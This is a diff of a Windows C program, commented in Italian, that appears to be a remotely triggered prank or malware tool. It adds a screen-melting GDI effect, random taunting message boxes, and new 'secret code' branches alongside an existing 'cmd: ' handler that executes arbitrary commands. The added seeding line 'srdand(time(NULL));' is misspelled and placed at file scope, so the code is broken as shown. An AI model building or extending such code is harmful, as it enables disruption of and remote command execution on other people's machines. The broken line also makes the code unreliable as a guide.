@@ -19,6 +19,7 @@ WHITENESS - white block
 //globalz
 int w; // width
 int h; // heigh
+srdand(time(NULL)); // seed random sul time (sec dal 1970)
 
 void heightglitch_run() {
     w = GetSystemMetrics(SM_CXSCREEN);
@@ -162,6 +163,19 @@ void bmp_on_screen() {
     ReleaseDC(NULL, hdc);
 }
 
+void fkngmelter() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hdc = GetDC(NULL);
+    static int x = 0; // static, altrimenti reset brutale
+
+    x = rand() % w;
+    BitBlt(hdc, x, 5, 4, h, hdc, x, 0, SRCCOPY);
+    ReleaseDC(NULL, hdc);
+    Sleep(1);
+}
+
 void startfx() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
@@ -173,6 +187,26 @@ void startfx() {
     circleshake_run();
     ltunnel_run();
     squarefx_run();
+    fkngmelter();
+}
+
+void msgbox() {
+    // [x][y]
+    // x = contenitore (aka skatola)
+    // y = byte (o char (bcz 1 char = 1 byte)) per contenitore
+    // se ho x byte devo dichiarare x + 1. Ex: in una frase di 7 char ne devo dikiarare 8 bcz '\0' ('\0' sta sempre alla fine!)
+    // if u want puoi togliere il [6] in [], il compilatore capisce dal numero di frasi.
+    char frasi[6][20] = { // ricordiamo il seguente personaggio: Breiscot (aka DMAX, QLIMAX, EMACS) - Ha dato contributo nelle frasi di testing
+        "Subwoofer was here",
+        "THWP is the best",
+        "whoami? root!",
+        "ping pong.local",
+        "ZWwza3RyMHcxbmQwdzcgdzRzIGgzcjM=",
+        "... nothing ..."
+    };
+
+    int randomtext = rand() % 6; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
+    MessageBox(NULL, frasi[randomtext], "testo", MB_OK | MB_ICONINFORMATION);
 }
 
 int main() {
@@ -195,7 +229,7 @@ int main() {
         printf("reqtextbuffer[]: %s\n", reqtextbuffer);
 
         /* 
-        CODENAMES:
+        Sicrez codz:
         AllFx - 1
         HeighGlitch - 2
         WidthGlitch - 3
@@ -205,7 +239,8 @@ int main() {
         BouncySquare - 7
 
         Misc:
-        "cmd: " - Exec a command
+        "cmd: " - xec a command
+        "CleanDWM" - cleana DWM
         */
 
         if (strstr(reqtextbuffer, "1")) {
@@ -258,6 +293,13 @@ int main() {
             }
         }
 
+        else if (strstr(reqtextbuffer, "8")) {
+            int i;
+            for (i=0;i<100;i++) {
+                fkngmelter();
+            }
+        }
+
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
             char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
             command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
@@ -272,6 +314,9 @@ int main() {
         }
         else if (strstr(reqtextbuffer, "BMPFx1")) {
             bmp_on_screen();
+        }
+        else if (strstr(reqtextbuffer, "RandomMSGs")) {
+            msgbox();
         }
         else {Sleep(20000);}
     }
